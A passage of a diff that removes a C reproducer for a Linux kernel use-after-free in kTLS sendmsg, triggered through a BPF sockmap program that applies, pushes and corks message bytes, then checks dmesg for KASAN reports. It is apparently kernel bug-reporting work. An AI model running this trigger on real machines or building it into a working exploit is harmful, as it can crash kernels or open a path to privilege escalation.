-		shutdown(client_fd, SHUT_RDWR);
-	usleep(100000);
-	if (client_fd >=3D 0)
-		close(client_fd);
-	if (listen_fd >=3D 0)
-		close(listen_fd);
-	if (map_fd_global >=3D 0) {
-		close(map_fd_global);
-		map_fd_global =3D -1;
-	}
-	if (bpf_prog_fd >=3D 0) {
-		close(bpf_prog_fd);
-		bpf_prog_fd =3D -1;
-	}
-}
-
-static int setup_and_trigger(int iteration)
-{
-	struct sockaddr_in addr;
-	socklen_t addrlen =3D sizeof(addr);
-	pthread_t tid;
-	int listen_fd =3D -1, client_fd =3D -1, map_fd =3D -1;
-
-	printf("[%d] Setting up TCP connection on loopback...\n", iteration);
-
-	listen_fd =3D socket(AF_INET, SOCK_STREAM, 0);
-	if (listen_fd < 0) {
-		perror("socket(listen)");
-		return 1;
-	}
-
-	memset(&addr, 0, sizeof(addr));
-	addr.sin_family =3D AF_INET;
-	addr.sin_addr.s_addr =3D htonl(INADDR_LOOPBACK);
-	addr.sin_port =3D 0;
-
-	if (bind(listen_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
-		perror("bind");
-		close(listen_fd);
-		return 1;
-	}
-
-	if (listen(listen_fd, 1) < 0) {
-		perror("listen");
-		close(listen_fd);
-		return 1;
-	}
-
-	addrlen =3D sizeof(addr);
-	getsockname(listen_fd, (struct sockaddr *)&addr, &addrlen);
-
-	pthread_create(&tid, NULL, server_thread, &listen_fd);
-
-	client_fd =3D socket(AF_INET, SOCK_STREAM, 0);
-	if (client_fd < 0) {
-		perror("socket(client)");
-		cleanup(client_fd, listen_fd);
-		pthread_join(tid, NULL);
-		return 1;
-	}
-
-	if (connect(client_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
-		perror("connect");
-		cleanup(client_fd, listen_fd);
-		pthread_join(tid, NULL);
-		return 1;
-	}
-
-	/* STEP 1: Create sockmap and attach BPF BEFORE setting up TLS ULP.
-	 * sk_psock_init() rejects sockets that already have ULP (TLS) attached. */
-	printf("[%d] Creating sockmap and loading BPF program...\n", iteration);
-
-	union bpf_attr map_attr;
-	memset(&map_attr, 0, sizeof(map_attr));
-	map_attr.map_type =3D BPF_MAP_TYPE_SOCKMAP;
-	map_attr.key_size =3D sizeof(int);
-	map_attr.value_size =3D sizeof(int);
-	map_attr.max_entries =3D 1;
-
-	map_fd =3D sys_bpf(BPF_MAP_CREATE, &map_attr);
-	if (map_fd < 0) {
-		perror("bpf(BPF_MAP_CREATE)");
-		cleanup(client_fd, listen_fd);
-		pthread_join(tid, NULL);
-		return 1;
-	}
-	map_fd_global =3D map_fd;
-
-	char log_buf[4096] =3D {0};
-	union bpf_attr prog_attr;
-	memset(&prog_attr, 0, sizeof(prog_attr));
-	prog_attr.prog_type =3D BPF_PROG_TYPE_SK_MSG;
-	prog_attr.insns =3D (unsigned long long)bpf_prog;
-	prog_attr.insn_cnt =3D sizeof(bpf_prog) / sizeof(bpf_prog[0]);
-	prog_attr.license =3D (unsigned long long)"GPL";
-	prog_attr.log_buf =3D (unsigned long long)log_buf;
-	prog_attr.log_size =3D sizeof(log_buf);
-	prog_attr.log_level =3D 1;
-	prog_attr.kern_version =3D 0;
-
-	bpf_prog_fd =3D sys_bpf(BPF_PROG_LOAD, &prog_attr);
-	if (bpf_prog_fd < 0) {
-		perror("bpf(BPF_PROG_LOAD)");
-		fprintf(stderr, "BPF verifier log:\n%s\n", log_buf);
-		cleanup(client_fd, listen_fd);
-		pthread_join(tid, NULL);
-		return 1;
-	}
-
-	union bpf_attr attach_attr;
-	memset(&attach_attr, 0, sizeof(attach_attr));
-	attach_attr.attach_type =3D BPF_SK_MSG_VERDICT;
-	attach_attr.target_fd =3D map_fd;
-	attach_attr.attach_bpf_fd =3D bpf_prog_fd;
-
-	if (sys_bpf(BPF_PROG_ATTACH, &attach_attr) < 0) {
-		perror("bpf(BPF_PROG_ATTACH)");
-		cleanup(client_fd, listen_fd);
-		pthread_join(tid, NULL);
-		return 1;
-	}
-
-	/* Add client socket to sockmap BEFORE TLS setup */
-	int key =3D 0;
-	union bpf_attr update_attr;
-	memset(&update_attr, 0, sizeof(update_attr));
-	update_attr.map_fd =3D map_fd;
-	update_attr.key =3D (unsigned long long)&key;
-	update_attr.value =3D (unsigned long long)&client_fd;
-	update_attr.flags =3D 0;
-
-	if (sys_bpf(BPF_MAP_UPDATE_ELEM, &update_attr) < 0) {
-		perror("bpf(BPF_MAP_UPDATE_ELEM)");
-		cleanup(client_fd, listen_fd);
-		pthread_join(tid, NULL);
-		return 1;
-	}
-
-	/* STEP 2: Set up TLS ULP and kTLS TX */
-	printf("[%d] Enabling kTLS TX (AES-GCM-128)...\n", iteration);
-
-	/* Attach TLS ULP to the socket (TCP_ULP =3D 31) */
-	if (setsockopt(client_fd, IPPROTO_TCP, 31, "tls", 3) < 0) {
-		perror("setsockopt(TCP_ULP, tls)");
-		cleanup(client_fd, listen_fd);
-		pthread_join(tid, NULL);
-		return 1;
-	}
-
-	struct tls12_crypto_info_aes_gcm_128 crypto_info;
-	memset(&crypto_info, 0, sizeof(crypto_info));
-	crypto_info.info.version =3D TLS_1_2_VERSION;
-	crypto_info.info.cipher_type =3D TLS_CIPHER_AES_GCM_128;
-
-	if (setsockopt(client_fd, SOL_TLS, TLS_TX, &crypto_info, sizeof(crypto_info)=
-) < 0) {
-		perror("setsockopt(TLS_TX)");
-		fprintf(stderr, "Hint: CONFIG_TLS=3Dy required\n");
-		cleanup(client_fd, listen_fd);
-		pthread_join(tid, NULL);
-		return 1;
-	}
-
-	printf("[%d] Setup complete. Triggering UAF...\n", iteration);
-
-	char *buf =3D calloc(1, SEND_SIZE);
-	if (!buf) {
-		perror("calloc");
-		cleanup(client_fd, listen_fd);
-		pthread_join(tid, NULL);
-		return 1;
-	}
-
-	/* First send with MSG_MORE: accumulates data in the open record
-	 * without triggering bpf_exec_tx_verdict (eor=3Dfalse, full_record=3Dfalse)=
- */
-	printf("[%d] Sending %d bytes with MSG_MORE (accumulating)...\n", iteration,=
- SEND_SIZE);
-	ssize_t n =3D send(client_fd, buf, SEND_SIZE, MSG_MORE);
-	if (n < 0) {
-		fprintf(stderr, "[%d] First send failed: %s\n", iteration, strerror(errno));
-		free(buf);
-		cleanup(client_fd, listen_fd);
-		pthread_join(tid, NULL);
-		return 1;
-	}
-	printf("[%d] Sent %zd bytes (MSG_MORE)\n", iteration, n);
-
-	/* Second send without MSG_MORE: eor=3Dtrue triggers bpf_exec_tx_verdict.
-	 * BPF program sets apply_bytes(100) -> split -> push_data(200) -> cork_byte=
-s(32768).
-	 * Split frees the original record, remainder goes to 2nd BPF call which
-	 * sets cork_bytes > remainder size -> -ENOSPC -> UAF on dangling msg_pl. */
-	printf("[%d] Sending %d bytes without MSG_MORE (triggering UAF)...\n", itera=
-tion, SEND_SIZE);
-	n =3D send(client_fd, buf, SEND_SIZE, 0);
-	if (n < 0) {
-		fprintf(stderr, "[%d] Second send: %s (errno=3D%d)\n", iteration, strerror(=
-errno), errno);
-	} else {
-		printf("[%d] Sent %zd bytes\n", iteration, n);
-	}
-
-	free(buf);
-	usleep(50000);
-
-	printf("[%d] Checking dmesg for KASAN reports...\n", iteration);
-	fflush(stdout);
-	system("dmesg | grep -iE 'BUG:|KASAN:|use-after-free|slab-use-after-free|tls=
-_sw_sendmsg' | tail -10");
-
-	cleanup(client_fd, listen_fd);
-	pthread_join(tid, NULL);
-	return 0;
-}
-
-int main(void)
-{
-	printf("[*] Reproducer: TLS kTLS sendmsg cork UAF (7723129261d0)\n");
-	printf("[*] Trigger: bpf_msg_apply_bytes() + bpf_msg_push_data() + bpf_msg_c=
-ork_bytes()\n");
-	printf("[*] BPF helpers: apply=3D%d, cork=3D%d, push=3D%d\n",
-	       BPF_FUNC_msg_apply_bytes, BPF_FUNC_msg_cork_bytes, BPF_FUNC_msg_push_=
-data);
-	printf("[*] Running %d iterations\n\n", NUM_ITERATIONS);
-
-	alarm(60);
-	system("dmesg -C 2>/dev/null");
-
-	for (int i =3D 0; i < NUM_ITERATIONS; i++) {
-		int ret =3D setup_and_trigger(i);
-		if (ret !=3D 0) {
-			fprintf(stderr, "[%d] Setup/trigger failed with code %d\n", i, ret);
-			continue;
-		}
-
-		int kasan_found =3D 0;
-		FILE *fp =3D popen("dmesg | grep -ciE 'KASAN:.*use-after-free|slab-use-afte=
-r-free' 2>/dev/null", "r");
-		if (fp) {
-			int count =3D 0;
-			if (fscanf(fp, "%d", &count) =3D=3D 1 && count > 0)
-				kasan_found =3D 1;
-			pclose(fp);
-		}
-
-		if (kasan_found) {
-			printf("\n[!] KASAN use-after-free detected at iteration %d!\n", i);
-			break;
-		}
-	}
-
-	printf("\n[*] Final dmesg check:\n");
-	fflush(stdout);
-	system("dmesg | grep -iE 'BUG:|KASAN:|use-after-free|slab-use-after-free|tls=
-_sw_sendmsg' | tail -30");
-
-	return 0;
-}
